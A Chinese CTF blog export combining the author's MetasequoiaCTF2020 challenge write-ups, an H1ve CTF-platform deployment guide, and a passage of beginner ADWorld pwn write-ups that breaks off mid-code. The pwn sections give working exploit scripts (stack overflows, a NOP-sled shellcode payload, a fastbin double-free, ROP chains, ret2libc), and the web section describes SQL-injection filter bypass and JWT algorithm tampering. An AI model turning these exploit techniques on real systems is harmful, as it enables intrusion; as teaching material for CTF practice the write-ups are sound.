sub_8048658 返回的 flag 值，因此在后者下断点调试，打印 eax 值即得到 flag。\nb *0x8048658 r fin x/16sw $eax Babysmali # 题目给了 smali.jar 以及 src.smali，我们先将后者汇编成 dex 文件。\n$ java -jar smali.jar assemble src.smali -o src.dex 然后使用 jadx 反编译 dex 文件：\npackage com.example.hellosmali.hellosmali; public class Digest { public static boolean check(String input) { String str = \u0026#34;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34;; if (input == null || input.length() == 0) { return false; } int i; char[] charinput = input.toCharArray(); StringBuilder v2 = new StringBuilder(); for (char toBinaryString : charinput) { String intinput = Integer.toBinaryString(toBinaryString); while (intinput.length() \u0026lt;8) { intinput = \u0026#34;0\u0026#34; + intinput; } v2.append(intinput); } while (v2.length() % 6 != 0) { v2.append(\u0026#34;0\u0026#34;); } String v1 = String.valueOf(v2); char[] v4 = new char[(v1.length() / 6)]; for (i = 0; i \u0026lt; v4.length; i++) { int v6 = Integer.parseInt(v1.substring(0, 6), 2); v1 = v1.substring(6); v4[i] = str.charAt(v6); } StringBuilder v3 = new StringBuilder(String.valueOf(v4)); if (input.length() % 3 == 1) { v3.append(\u0026#34;!?\u0026#34;); } else if (input.length() % 3 == 2) { v3.append(\u0026#34;!\u0026#34;); } if (String.valueOf(v3).equals(\u0026#34;xsZDluYYreJDyrpDpucZCo!?\u0026#34;)) { return true; } return false; } } 从字符集可以看出和 Base64 编码有关，实际上只是它的一个变种。既可以用 python 解，也可以用 java 解，python 版：\nimport string base64_charset = \u0026#39;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; def decode(base64_str): \u0026#34;\u0026#34;\u0026#34; 解码 base64 字符串 :param base64_str:base64 字符串 :return: 解码后的 bytearray；若入参不是合法 base64 字符串，返回空 bytearray \u0026#34;\u0026#34;\u0026#34; # 对每一个 base64 字符取下标索引，并转换为 6 为二进制字符串 base64_bytes = [\u0026#39;{:0\u0026gt;6}\u0026#39;.format(str(bin(base64_charset.index(s))).replace(\u0026#39;0b\u0026#39;, \u0026#39;\u0026#39;)) for s in base64_str if s != \u0026#39;=\u0026#39;] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: # 取 4 个 6 位 base64 字符，作为 3 个字节 tmp_unit = \u0026#39;\u0026#39;.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = \u0026#39;\u0026#39;.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return resp if __name__==\u0026#34;__main__\u0026#34;: print decode(\u0026#39;A0NDlKJLv0hTA1lDAuZRgo==\u0026#39;) java 版：\npublic class XMan { public static void main(String[] args) { String v6 = \u0026#34;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34;; String s = \u0026#34;xsZDluYYreJDyrpDpucZCo\u0026#34;; StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; s.length(); i++) { int tmp = v6.indexOf(s.charAt(i)); String ss = Integer.toBinaryString(tmp); if (ss.length() == 5) { ss = \u0026#34;0\u0026#34; + ss; } else if (ss.length() == 4) { ss = \u0026#34;00\u0026#34; + ss; } else if (ss.length() == 3) { ss = \u0026#34;000\u0026#34; + ss; } else if (ss.length() == 2) { ss = \u0026#34;0000\u0026#34; + ss; } else if (ss.length() == 1) { ss = \u0026#34;00000\u0026#34; + ss; } else if (ss.length() == 0) { ss = \u0026#34;000000\u0026#34; + ss; } sb.append(ss); } String x = sb.toString() +\u0026#34;0000\u0026#34;; StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i \u0026lt; x.length(); i += 8) { String tmp = x.substring(i, i + 8); byte b = (byte) Integer.parseInt(tmp, 2); stringBuilder.append((char) b); } System.out.println(stringBuilder.toString()); } } Prison # 这是一道纯迷宫题，只是工作量有点大。参考 WP。\nPwn # 所有题目均为 64 位程序，libc 版本 2.23。\nBlacksmith # Pwn 类签到题。本题的输出让这题看上去像堆题，但实际上只有第一个锻造剑的功能是有实际作用的。可以看到在给剑命名时，首先要输入名字长度，如果长度超过 0x40 则失败。但是注意到名字长度这个变量是无符号的，因此可以整数溢出：输入 -1，则可输入 0xffffffffffffffff 字符，绕过了这个判断。\n随后就可以栈溢出了，程序中存在后门函数，直接 ret2text。\nsla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;name?\\n\u0026#39;,\u0026#39;-1\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x48,0x4007d6) sla(\u0026#39;is?\\n\u0026#39;,payload) Snow Mountain # 这题关闭了 NX 保护，说明需要布置 shellcode，难点在于找到 shellcode 位置。程序首先给出一个栈上的随机地址，并且栈上存在一个 0x1000 的字符数组。根据题目提示 \u0026ldquo;滑雪\u0026rdquo;、\u0026ldquo;雪橇\u0026rdquo; 等，容易想到利用 nop sled 滑到 shellcode 的位置来增加容错率。想到 nop sled 的话这题就做完了。\nru(\u0026#39;position: 0x\u0026#39;) cur = int(ru(\u0026#39;\\n\u0026#39;),16) leak(\u0026#39;cur\u0026#39;,cur) payload = asm(shellcraft.sh()) payload = payload.rjust(0x1000-1,\u0026#39;\\x90\u0026#39;) sla(\u0026#39;\u0026gt; \u0026#39;,payload) sla(\u0026#39;\u0026gt; \u0026#39;,hex(cur)) Summoner # 本次比赛唯二的堆题，但是极其简单。邪恶召唤师召唤了一只 5 级生物，但是你只能召唤四级生物，你的目的就是修改生物的等级为 5 级。\n题目提供了几种命令：\n展示召唤物信息 召唤一只生物，并给它起名字 设置生物的等级，但必须小于 5 攻击敌方召唤物 释放召唤物 我们通过逆向可以得知，召唤物的结构体长这样：\nstruct creature { char *name; int level; }; 随后可以发现两处漏洞：\n召唤时，输入的 name 使用 strdup 函数（隐式调用了 malloc），但并没有检查长度，因此可以溢出到下一个 8 字节处。 在释放召唤物时，只会调用 free(c-\u0026gt;name)，然后将结构体指针置空，但并不会释放结构体指针本身。 因此我们尝试先召唤一个名为 aaaaaaaa\\x05 的生物，此时堆结构如下：\npwndbg\u0026gt; heapls ADDR SIZE STATUS sbrk_base 0x56476bb24000 chunk 0x56476bb24000 0x1010 (inuse) chunk 0x56476bb25010 0x20 (inuse) chunk 0x56476bb25030 0x20 (inuse) chunk 0x56476bb25050 0x20fb0 (top) sbrk_end 0x56476bb46000 pwndbg\u0026gt; x/8gx 0x56476bb25010 0x56476bb25010: 0x0000000000000000 0x0000000000000021 0x56476bb25020: 0x000056476bb25040 0x0000000000000000 0x56476bb25030: 0x0000000000000000 0x0000000000000021 0x56476bb25040: 0x6161616161616161 0x0000000000000005 可以看到有 2 块 0x20 的 chunk，第一块是结构体指针，存放着 name 地址和 level 数值；第二块就是 name 了，存放着我们输入的 name，注意这时第二个 8 字节已经是 5 了。随后我们释放召唤物：\npwndbg\u0026gt; x/8gx 0x5621c569e010 0x5621c569e010: 0x0000000000000000 0x0000000000000021 0x5621c569e020: 0x00005621c569e040 0x0000000000000000 0x5621c569e030: 0x0000000000000000 0x0000000000000021 0x5621c569e040: 0x0000000000000000 0x0000000000000005 这时 name 被 free 了但指针还在，我们刚刚写的 \\x05 也还在。这时再召唤就能得到 0x5621c569e030 处的一块 chunk 作为结构体指针，而新的 name 跑到了 0x55feced35050：\npwndbg\u0026gt; x/12gx 0x55feced35010 0x55feced35010: 0x0000000000000000 0x0000000000000021 0x55feced35020: 0x000055feced35040 0x0000000000000000 0x55feced35030: 0x0000000000000000 0x0000000000000021 0x55feced35040: 0x000055feced35060 0x0000000000000005 0x55feced35050: 0x0000000000000000 0x0000000000000021 0x55feced35060: 0x0000000000000061 0x0000000000000000 于是此时，结构体指针里的 level 就变成了 5。\nsla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;summon aaaaaaaa\u0026#39;+\u0026#39;\\x05\u0026#39;) sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;release\u0026#39;) sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;summon a\u0026#39;) sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;strike\u0026#39;) Demon Dragon # 题目本身不难，略微有些工作量。\n首先是逆向程序，一开始会调用 6 个函数，这 6 个函数来自题目同时给出的 libmagic.so，目的是为了让这 6 个函数被动态链接进来，可以直接忽略。随后，Demon Dragon 会使用 5 种元素攻击你，元素的顺序是随机的。接下来需要输入使用的技能，这里存在简单的 gets 栈溢出。但是并不清楚溢出之后要干什么。\n然后我们逆向 libmagic.so，这个文件保留了符号表，因此可以看到刚才的 6 个函数，分别是 5 种元素护盾和一个 check 函数。观察后可以发现每种元素护盾都可以克制另一种元素（克制关系在题目描述里），当 5 种攻击都被克制后就可以通过 check 来拿到 flag。可以看到 check 里存在 system(\u0026quot;cat flag\u0026quot;);，如果这个函数不是动态链接的，选手可以直接栈溢出跳到这里。此外，5 种护盾如果没有符号表则逆向难度较大，因此我把它们和 check 都编译成了动态链接库。\n最后来看护盾如何调用：所有护盾都只需要函数参数等于特定值即可成功调用，区别仅仅是特定值与参数个数不同。那么如何控制参数呢？这是 64 位程序，我们需要控制前三个参数寄存器 rdi,rsi,rdx。前两者在偏移过的 __lib_csu_init 中可以找到，比较通用：\npop rdi; ret pop rsi; pop r15; ret 而 rdx 不太好控制，于是我在程序中直接硬编码了一个 gadget：\npop rdi; pop rsi; pop rdx; ret 这样就可以构造 rop 链了，按元素克制关系调用 5 种护盾，最后返回到 check 函数 getflag。不要忘了 check 函数也需要参数，这个参数可以参考第一次调用 check 时候的参数，位于 0x6020b0。\nru(\u0026#39;with\u0026#39;) elem = [ru(\u0026#39;, \u0026#39;) for i in range(4)] elem.append(ru(\u0026#39;!\\n\u0026#39;)) pop_rdi = 0x400e43 # 1 pop_rsi = 0x400e41 # 2 pop3 = 0x400c3a # 1,2,3 strategy = { \u0026#39;gold\u0026#39;: flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt[\u0026#39;fire_shield\u0026#39;]), \u0026#39;wood\u0026#39;: flat(pop_rdi,0xdeadbeef,elf.plt[\u0026#39;gold_shield\u0026#39;]), \u0026#39;water\u0026#39;: flat(pop_rdi,0xfee1dead,elf.plt[\u0026#39;earth_shield\u0026#39;]), \u0026#39;fire\u0026#39;: flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt[\u0026#39;water_shield\u0026#39;]), \u0026#39;earth\u0026#39;: flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt[\u0026#39;wood_shield\u0026#39;]) } payload = \u0026#39;a\u0026#39;*0x48 for attack in elem: payload += strategy[attack] pos = 0x6020b0 payload += flat(pop_rdi,pos,elf.plt[\u0026#39;check\u0026#39;]) sla(\u0026#39;Skill\u0026gt; \u0026#39;,payload) 注意链接时 libmagic.so 的目录，我放在和源程序同一目录下因此使用选项 -L.。同时 /usr/lib/ 下也需要有 libmagic.so。\n此外，感谢 TaQini 师傅提供的非预期解：直接 ret2libc。\n这么一说我才想起来，我原来确实是打算出 ret2libc 的，不知道怎么就改成了这个样子。\nSamsara # 又一道堆题，应该是最难的 Pwn 题。\n逆向可以知道每次抓人都执行 malloc(8)，我们不能控制分配的大小。那么在释放的时候，chunk 必定进入 fastbin。操作 3 就是编辑 chunk 的内容，不存在溢出。但是这题有两个奇怪的操作：输入 4 会打印出栈上变量 lair 的位置，输入 5 会改变 lair 的值。最后，退出程序时，检查栈上变量 target 是否等于 0xdeadbeef，如果等于就能 getflag，但是整个程序中不存在对 target 的任何读写操作。\n漏洞点在于 free 之后没有置指针为 NULL，考虑 double free。首先分配三个 chunk，按 chunk0-\u0026gt;chunk1-\u0026gt;chunk0 的顺序释放，第二次释放 chunk0 时它不在对应 fastbin 的头部，因此不会被检测到。再申请两次分别得到 chunk3 和 chunk4，按 first-fit 原则前者即 chunk0，后者即 chunk1，但此时 chunk0 依然会留在 fastbin 中。\n接下来，我们在 target 附近伪造 chunk。我们逆向发现 lair 在 target 上方 8B 处，因此先输入 4，设置 lair=0x20 以伪造 chunk_size。然后输入 5 得到 \u0026amp;lair，那么 \u0026amp;lair-8 处就是伪造的 chunk 的 chunk 指针。伪造好以后，我们向 chunk3 即 chunk0 的 fd 写入 \u0026amp;lair-8。此时，fastbin 内就变成了 chunk0-\u0026gt;fake_chunk，申请一次得到 chunk0，第二次得到 fake_chunk。\n此时向 fake_chunk 写数据，等价于向 (\u0026amp;lair-8) + 0x10 也就是 target 写数据，写入 0xdeadbeef 并退出程序即可。\ndef add(): sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;1\u0026#39;) def delete(index): sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(index)) def edit(index,content): sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(index)) sla(\u0026#39;:\\n\u0026#39;,content) def show(): sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;4\u0026#39;) ru(\u0026#39;0x\u0026#39;) return int(ru(\u0026#39;\\n\u0026#39;),16) def move(dest): sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;5\u0026#39;) sla(\u0026#39;?\\n\u0026#39;, str(dest)) add() # 0 add() # 1 add() # 2 delete(0) delete(1) delete(0) add() # 3 \u0026lt;-\u0026gt; 0 add() # 4 move(0x20) fake = show()-8 edit(3,fake) add() # 5 add() # 6 edit(6,0xdeadbeef) sla(\u0026#39;\u0026gt; \u0026#39;,\u0026#39;6\u0026#39;) Web # UTF-8 # 题目给了一个 rfc3629 的链接，也就是 UTF-8 编码的 RFC 文件。\n首先访问发现是空页面，扫一下可以发现 robots.txt，指向一个奇怪的文件：\nlength q chdir lc and print chr ord q each le and print chr ord q lc eval and print chr ord q lt eval and print chr ord q sin s and print chr ord q xor x and print chr ord qw q not q and print chr oct oct ord q eq ge and print chr ord q msgctl m and print chr ord q local and print chr ord q dump and and print chr ord q or no and print chr ord q oct no and print chr ord q ge log 提示说 chmod +x secretscript，说明这个文件是可以运行的，因此猜想这是脚本文件，查阅资料可知这是 ppencoding，放入在线 Perl 运行工具运行一下，得到：\naction=source 把这个当作 GET 参数，访问得到源码：\n\u0026lt;?php $conn-\u0026gt;query(\u0026#34;set names utf8\u0026#34;); $sql = \u0026#34;create table `user` ( `id` int(10) unsigned NOT NULL PRIMARY KEY AUTO_INCREMENT , `username` varchar(30) NOT NULL, `passwd` varchar(32) NOT NULL, `role` varchar(30) NOT NULL )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci \u0026#34;; if ($conn-\u0026gt;query($sql)) { $sql = \u0026#34;insert into `user`(`username`,`passwd`,`role`) values (\u0026#39;admin\u0026#39;,\u0026#39;\u0026#34;.md5(randStr()).\u0026#34;\u0026#39;,\u0026#39;admin\u0026#39;)\u0026#34;; $conn-\u0026gt;query($sql); } function filter($str) { $filter = \u0026#34;/ |\\*|,|;|union|is|like|regexp|and|or|for|file|#|--|\\||\u0026amp;|`|\u0026#34;.urldecode(\u0026#39;%a0\u0026#39;).\u0026#34;|\u0026#34;.urldecode(\u0026#34;%0a\u0026#34;).\u0026#34;|\u0026#34;.urldecode(\u0026#34;%0b\u0026#34;).\u0026#34;|\u0026#34;.urldecode(\u0026#39;%0c\u0026#39;).\u0026#34;|\u0026#34;.urldecode(\u0026#39;%0d\u0026#39;).\u0026#34;|\u0026#34;.urldecode(\u0026#39;%09\u0026#39;).\u0026#34;/i\u0026#34;; if(preg_match($filter,$str)) { die(\u0026#34;?\u0026#34;); } return $str; } function login($username,$passwd) { global $conn; $username = trim(strtolower($username)); $passwd = trim(strtolower($passwd)); if ($username ==\u0026#39;admin\u0026#39;) { die(\u0026#34;No, I know you are not admin.\u0026#34;); } $sql = \u0026#34;select * from `user` where username=\u0026#39;\u0026#34;.$conn-\u0026gt;escape_string($username).\u0026#34;\u0026#39; and passwd=\u0026#39;\u0026#34;.$conn-\u0026gt;escape_string($passwd).\u0026#34;\u0026#39;\u0026#34;; $res = $conn-\u0026gt;query($sql); if ($res-\u0026gt;num_rows \u0026gt; 0) { if($res-\u0026gt;fetch_assoc()[\u0026#39;role\u0026#39;] ===\u0026#39;admin\u0026#39;) { exit($flag); } } else { echo \u0026#34;Username / Passwd Error!\u0026#34;; } } $username = isset($_POST[\u0026#39;username\u0026#39;])?filter($_POST[\u0026#39;username\u0026#39;]):\u0026#34;\u0026#34;; $passwd = isset($_POST[\u0026#39;passwd\u0026#39;])?filter($_POST[\u0026#39;passwd\u0026#39;]):\u0026#34;\u0026#34;; $action = isset($_GET[\u0026#39;action\u0026#39;])?filter($_GET[\u0026#39;action\u0026#39;]):\u0026#34;\u0026#34;; switch($action) { case \u0026#34;source\u0026#34;: source(); break; case \u0026#34;login\u0026#34; : login($username,$passwd);break; case \u0026#34;show\u0026#34; : show($username);break; } echo \u0026#39;R U sure U R familiar with UTF-8?\u0026#39;; 过滤了很多字符，但是并不是没有报错注入的可能，利用 solve.py 可以注入出管理员密码。\n但是直接用 admin 和密码登录是不行的，因为有如下判断：\nif ($username ==\u0026#39;admin\u0026#39;) { die(\u0026#34;No, I know you are not admin.\u0026#34;); } 这里的绕过技巧来自 这篇文章，细节还是比较多的，也是这题名称的由来。\njwt # JSON Web Token 算法篡改攻击，看了 这篇文章 后改的题。最后访问 admin 的 note 的时候，会得到一个 url 路径，访问该路径即为 flag。这样做是为了支持动态 flag，因为 sqlite 对读文件的支持不是特别好。\n","date":"2020-02-15","permalink":"/posts/metasequoiactf2020/","section":"Posts","summary":"\u003cp\u003e第一次出题，经验不足，感谢参赛选手海涵。\u003c/p\u003e","title":"牛刀小试：MetasequoiaCTF2020 部分题解"},{"content":"最近 H1ve 平台开源了，这是我在 GitHub 上见到的目前完成度最高的带 AWD 模式的平台。尽管如此依然遇到了不少 bug，经修复后现在的版本还算稳定。\n平台基于 CTFd，解题赛使用 CTFd-owl 插件，攻防赛使用 CTFd-Glowworm 插件。\n技术架构 # 盗了张图，这里是 BUUCTF 的架构，与 H1ve 搭建的架构类似，仅仅是将 CTFd-Whale 替换成了 CTFd-Owl（前者使用 docker-swarm 而后者使用 docker-compose）。\n操作步骤 # 首先是第一次运行需要 setup，随便设置一个管理员账号就行。随后添加用户，因为管理员用户比较特殊，在进行参赛、提交等操作时会出问题。接着在 config 的 time 里设置一个比赛开始时间，这一点十分重要，否则后续在 glowworm 里点击 init competition 会出错。\n接下来开始添加题目。在此之前先要配置好插件。\nOwl # Docker Settings 里可以设置：\nflag 前缀 Docker API，可以使用默认的 unix://var/run/docker.sock 最大容器数量，默认没有限制，不建议使用默认值 单个容器最大续期次数 FRP Settings 里可以设置：\nFRP 域名后缀，用于动态域名转发，如果直接使用 IP 的话就不需要填了 FRP 服务器 IP，使用单个服务器一般填 0.0.0.0，但是试了一下也可以填域名 FRP 最小 / 最大端口，记得防火墙开放相应端口 FRP 配置模板 配置模板可以直接使用默认配置：\n[common] token = random_this server_addr = frps server_port = 80 admin_addr = 0.0.0.0 admin_port = 7400 解题赛添加题目 # 题目类型：dynamic_check_docker 部署方式：single_docker_compose 题目路径：相对于 source 目录的路径 FRP 类型：IP 访问用 DIRECT，域名访问用 http FRP 端口：题目在 docker 中的内网端口，这里我使用的是 web 题 80，pwn 题 10000 题目名称 题目所属分类：web/pwn/misc/crypto/reverse/\u0026hellip; 题目描述 题目初始分数 题目最低分数 达到最低分数所需的正确提交次数 最大尝试次数，0 为无限制 题目是否可见 题目创建后可以在题目详情页左侧查看正确提交、手动更新 flag、上传附件、设置标签、添加提示、设置前置解题要求等等。\nGlowworm # Competition Settings 里可以设置：\nDocker API，可以使用默认的 unix://var/run/docker.sock 服务器 IP，使用单个服务器一般填 0.0.0.0 容器 root 用户的密码 每轮时间（秒） 是否开启随机端口 攻防赛添加题目 # 题目类型：ada_challenge 题目路径：相对于 ctfd_glowworm 目录的路径 题目在 dockerhub 上的镜像名（这种方式会更方便一些） CPU 限制，默认 0.5 内存限制，默认 512M 容器端口：容器在 docker 中的内网端口 题目所属分类：web1/pwn1/web2/pwn2/\u0026hellip;，不可重复 题目语言：Django/PHP/Node/PWN 题目描述 攻击分数 checker 分数 添加完后，确保 config 的 time 里设置好了开始时间，随后进入插件的 Environments 页面点击 init competition，然后对每道题依次 Build-\u0026gt;Run-\u0026gt;Check。\n题目模板 # 只有 web 和 pwn 需要部署靶机，pwn 题比较容易。参考 BUUCTF 题目贡献指南，首先新建目录，把二进制文件放进去命名为 pwn，然后编写 Dockerfile：\nFROM glzjin/pwn_base_18 COPY pwn /pwn/pwn 其中 glzjin/pwn_base_x 代表 Ubuntu x.04，x 可以是 16/18/19/20。\n然后编写 docker-compose.yaml：\nversion: \u0026#34;2\u0026#34; services: service: build: . image: pwn1 ports: - 9999:10000 volumes: - \u0026#34;$PWD/flag:/pwn/flag\u0026#34; tty: true networks: - net networks: net: external: name: h1ve_frp_containers 如果修改了 ports 里的 9999，则需要对 H1ve 源码进行对应的修改，因为源码中直接将 9999 替换为随机的端口号。\nweb 的话就不能偷懒了，需要自己写 Dockerfile。随后编写 docker-compose.yaml，这里放一个官方的例子：\nversion: \u0026#34;2\u0026#34; services: # 基本环境 service: # 容器名字 # build 该置顶目录下的 dockerfile build: . # image 指定 build Dockerfile 生成镜像的名称 image: 0akarma-file-upload ports: - 9999:80 volumes: # 挂载的 Flag - \u0026#34;$PWD/flag:/var/www/html/include/flag:ro\u0026#34; - \u0026#34;$PWD/apache2.conf:/etc/apache2/apache2.conf\u0026#34; tty: true networks: - net networks: # 配置 docker network net: external: name: h1ve_frp_containers ports 这里和 pwn 题同理，volumes 下可以按需挂载需要的文件。\n题目构建好后，就可以 Launch instance 测试一下了，第一次运行的话可能会比较慢。\n坑点 # Redis # 我没接触过 Redis 所以不太懂，但是在 MetasequoiaCTF 比赛过程中平台大约每 2 个多小时会崩一次，原因就在于 redis 达到了最大连接数。用 redis-cli 查看 info clients 发现连接数持续增长，到了默认的 maxclients 也就是 10000 的时候平台就没了。\n我尝试设置 config set timeout 600，但是似乎不起作用，依然有些连接的 idle 时间超过 600。暂时的解决方案是：\n$ ulimit -Sn 100000 $ redis-cli 127.0.0.1:6379\u0026gt; config set timeout 600 OK 127.0.0.1:6379\u0026gt; config set maxclients 100000 OK 这样以后貌似情况有所改观，当然也可能是我的错觉。。\nFreeze 功能 # 这个错误就比较低级了，设置好 Freeze 时间后计分板坏了。错误位于 H1ve/CTFd/plugins/ctfd-matrix-scoreboard/__init__.py:56：\nfreeze = utils.get_config(\u0026#39;freeze\u0026#39;) if freeze: freeze = CTFd.utils.unix_time_to_utc(freeze) if teamid != session.get(\u0026#39;id\u0026#39;): basic_solves = basic_solves.filter(Solves.date \u0026lt; freeze) basic_solves = basic_solves.all() 把 CTFd.utils 去掉就不会报错了，因为之前已经有：\nfrom CTFd.utils.dates import unix_time_to_utc ","date":"2020-02-09","permalink":"/posts/h1ve-deploy/","section":"Posts","summary":"\u003cp\u003e最近 H1ve 平台开源了，这是我在 GitHub 上见到的目前完成度最高的带 AWD 模式的平台。尽管如此依然遇到了不少 bug，经修复后现在的版本还算稳定。\u003c/p\u003e","title":"捅马蜂窝：H1ve 部署实践"},{"content":"近期做的一些简单 Pwn 题记录。题目来自 ADWorld 新手区、BJDCTF 2019、JarvisOJ。\nADWorld 新手区 # level2 # 基本的栈溢出到 system 地址随后传入 /bin/sh 地址，后者可通过 ROPgadget 搜索到。\nru(\u0026#39;Input:\\n\u0026#39;) binsh = 0x804a024 payload = flat(\u0026#39;a\u0026#39;*(0x88+4),elf.plt[\u0026#39;system\u0026#39;],\u0026#39;a\u0026#39;*4, binsh) sl(payload) guess_num # __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int v4; // [rsp+4h] [rbp-3Ch] int i; // [rsp+8h] [rbp-38h] int v6; // [rsp+Ch] [rbp-34h] char v7; // [rsp+10h] [rbp-30h] unsigned int seed[2]; // [rsp+30h] [rbp-10h] unsigned __int64 v9; // [rsp+38h] [rbp-8h] v9 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); v4 = 0; v6 = 0; *(_QWORD *)seed = sub_BB0(); puts(\u0026#34;-------------------------------\u0026#34;); puts(\u0026#34;Welcome to a guess number game!\u0026#34;); puts(\u0026#34;-------------------------------\u0026#34;); puts(\u0026#34;Please let me know your name!\u0026#34;); printf(\u0026#34;Your name:\u0026#34;, 0LL); gets(\u0026amp;v7); srand(seed[0]); for (i = 0; i \u0026lt;= 9; ++i) { v6 = rand() % 6 + 1; printf(\u0026#34;-------------Turn:%d-------------\\n\u0026#34;, (unsigned int)(i + 1)); printf(\u0026#34;Please input your guess number:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); puts(\u0026#34;---------------------------------\u0026#34;); if (v4 != v6) { puts(\u0026#34;GG!\u0026#34;); exit(1); } puts(\u0026#34;Success!\u0026#34;); } sub_C3E(); return 0LL; } 使用了 srand 生成随机种子，但是参数 seed 可以被 v7 覆盖，因此我们只需要控制 seed[0] 即可预测产生的随机数从而进入 sub_C3E 后门函数。\nru(\u0026#39;name:\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x20, 0) sl(payload) from ctypes import * libc = cdll.LoadLibrary(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) libc.srand(0) for i in range(10): sla(\u0026#39;number:\u0026#39;, libc.rand()%6+1) int_overflow # 本题只能 login，并输入用户名密码，随后进入 check_passwd 函数验证：\nchar *__cdecl check_passwd(char *s) { char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if (v3 \u0026lt;= 3u || v3\u0026gt; 8u ) { puts(\u0026#34;Invalid Password\u0026#34;); result = (char *)fflush(stdout); } else { puts(\u0026#34;Success\u0026#34;); fflush(stdout); result = strcpy(\u0026amp;dest, s); } return result; } 注意到这里我们希望进入 else 语句，将输入的 s 复制到 dest 所在地址处造成栈溢出。但是这要求 s 的长度大于 3 且小于 8，这个长度太短了。因此结合题名考虑整数溢出：这里的 v3 是无符号的 8 位整数，那么当字符串长度实际上只需要模 255 的结果大于 3 小于 8 即可。最后返回到后门函数。\nru(\u0026#39;choice:\u0026#39;) sl(\u0026#39;1\u0026#39;) ru(\u0026#39;username:\\n\u0026#39;) sl(\u0026#39;aaa\u0026#39;) ru(\u0026#39;passwd:\\n\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x14+4),elf.sym[\u0026#39;what_is_this\u0026#39;]) sl(payload.ljust(260,\u0026#39;a\u0026#39;)) cgpwn2 # 本题提供了一个 bss 段的可写的 name 字符串数组，显然就是要我们向其中写入 /bin/sh，然后通过溢出调用 system(\u0026quot;/bin/sh\u0026quot;)。\nru(\u0026#39;name\\n\u0026#39;) sl(\u0026#39;/bin/sh\u0026#39;) ru(\u0026#39;here:\\n\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x26+4),elf.plt[\u0026#39;system\u0026#39;],\u0026#39;a\u0026#39;*4,0x804a080) sl(payload) when_did_you_born # 这题要求输入的生日年份 v5 不能等于 1926，但是之后又要求 v5 等于 1926，两者之间存在一个 get(\u0026amp;v4) 的操作，很容易想到通过溢出 v4 来修改 v5 的值。\nru(\u0026#39;Birth?\\n\u0026#39;) sl(\u0026#39;1900\u0026#39;) ru(\u0026#39;Name?\\n\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x8,1926) sl(payload) hello_pwn # 直接计算得到偏移量为 4 并溢出为指定值即可，没有难度。\nru(\u0026#39;bof\\n\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*4,0x6e756161) sl(payload) level3 # 基础的 ret2libc，注意加载题目给定的 libc。\nru(\u0026#39;Input:\\n\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x88+4),elf.plt[\u0026#39;write\u0026#39;],elf.sym[\u0026#39;main\u0026#39;],1,elf.got[\u0026#39;write\u0026#39;],0x4) sl(payload) write = uu32(r(4)) leak(\u0026#39;write\u0026#39;,write) base = write - libc.sym[\u0026#39;write\u0026#39;] system = base + libc.sym[\u0026#39;system\u0026#39;] binsh = base + libc.search(\u0026#39;/bin/sh\u0026#39;).next() ru(\u0026#39;Input:\\n\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x88+4),system,\u0026#39;a\u0026#39;*4,binsh) sl(payload) string # 跟着剧情走一遍大概可以知道可以选的选项以及格式化字符串漏洞的存在。查看代码可以验证漏洞，关键是如何利用。\n我们在角色死亡的函数发现了一个分支：\nunsigned __int64 __fastcall sub_400CA6(_DWORD *a1) { void *v1; // rsi unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\u0026#34;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!\u0026#34;); puts(\u0026#34;Dragon say: HaHa! you were supposed to have a normal\u0026#34;); puts(\u0026#34;RPG game, but I have changed it! you have no weapon and\u0026#34;); puts(\u0026#34;skill! you could not defeat me !\u0026#34;); puts(\u0026#34;That\u0026#39;s sound terrible! you meet final boss!but you level is ONE!\u0026#34;); if (*a1 == a1[1] ) { puts(\u0026#34;Wizard: I will help you! USE YOU SPELL\u0026#34;); v1 = mmap(0LL, 0x1000uLL, 7, 33, 